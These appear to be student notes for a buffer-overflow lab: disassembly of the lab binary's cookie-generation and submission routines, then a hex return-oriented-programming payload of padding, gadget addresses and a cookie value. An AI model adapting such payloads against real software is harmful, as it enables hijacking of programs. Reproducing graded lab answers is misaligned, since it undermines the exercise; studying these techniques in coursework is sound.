  4036e6:       c6 43 02 00             movb   $0x0,0x2(%rbx)
  4036ea:       b8 00 00 00 00          mov    $0x0,%eax
  4036ef:       eb d5                   jmp    4036c6 <driver_post+0x23>
  4036f1:       48 83 ec 08             sub    $0x8,%rsp
  4036f5:       41 51                   push   %r9
  4036f7:       49 89 c9                mov    %rcx,%r9
  4036fa:       49 89 d0                mov    %rdx,%r8
  4036fd:       48 89 f9                mov    %rdi,%rcx
  403700:       48 89 f2                mov    %rsi,%rdx
  403703:       be 9a 3c 00 00          mov    $0x3c9a,%esi
  403708:       48 8d 3d 7a 10 00 00    lea    0x107a(%rip),%rdi        # 404789 <trans_char+0xc9>
  40370f:       e8 ea f5 ff ff          call   402cfe <submitr>
  403714:       48 83 c4 10             add    $0x10,%rsp
  403718:       eb ac                   jmp    4036c6 <driver_post+0x23>

000000000040371a <check>:
  40371a:       f3 0f 1e fa             endbr64
  40371e:       89 f8                   mov    %edi,%eax
  403720:       c1 e8 1c                shr    $0x1c,%eax
  403723:       74 1d                   je     403742 <check+0x28>
  403725:       b9 00 00 00 00          mov    $0x0,%ecx
  40372a:       83 f9 1f                cmp    $0x1f,%ecx
  40372d:       7f 0d                   jg     40373c <check+0x22>
  40372f:       89 f8                   mov    %edi,%eax
  403731:       d3 e8                   shr    %cl,%eax
  403733:       3c 0a                   cmp    $0xa,%al
  403735:       74 11                   je     403748 <check+0x2e>
  403737:       83 c1 08                add    $0x8,%ecx
  40373a:       eb ee                   jmp    40372a <check+0x10>
  40373c:       b8 01 00 00 00          mov    $0x1,%eax
  403741:       c3                      ret
  403742:       b8 00 00 00 00          mov    $0x0,%eax
  403747:       c3                      ret
  403748:       b8 00 00 00 00          mov    $0x0,%eax
  40374d:       c3                      ret

000000000040374e <gencookie>:
  40374e:       f3 0f 1e fa             endbr64
  403752:       53                      push   %rbx
  403753:       83 c7 01                add    $0x1,%edi
  403756:       e8 25 db ff ff          call   401280 <srandom@plt>
  40375b:       e8 50 dc ff ff          call   4013b0 <random@plt>
  403760:       89 c3                   mov    %eax,%ebx
  403762:       89 c7                   mov    %eax,%edi
  403764:       e8 b1 ff ff ff          call   40371a <check>
  403769:       85 c0                   test   %eax,%eax
  40376b:       74 ee                   je     40375b <gencookie+0xd>
  40376d:       89 d8                   mov    %ebx,%eax
  40376f:       5b                      pop    %rbx
  403770:       c3                      ret

Disassembly of section .fini:

0000000000403774 <_fini>:
  403774:       f3 0f 1e fa             endbr64
  403778:       48 83 ec 08             sub    $0x8,%rsp
  40377c:       48 83 c4 08             add    $0x8,%rsp
  403780:       c3                      ret
```





```c
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
5b 21 40 00 00 00 00 00
6e 21 45 4e 00 00 00 00
1c 21 40 00 00 00 00 00
4a 1f 40 00 00 00 00 00
```

4e45216e



1. 40215d/b
1. 48 89 c8

401f4a
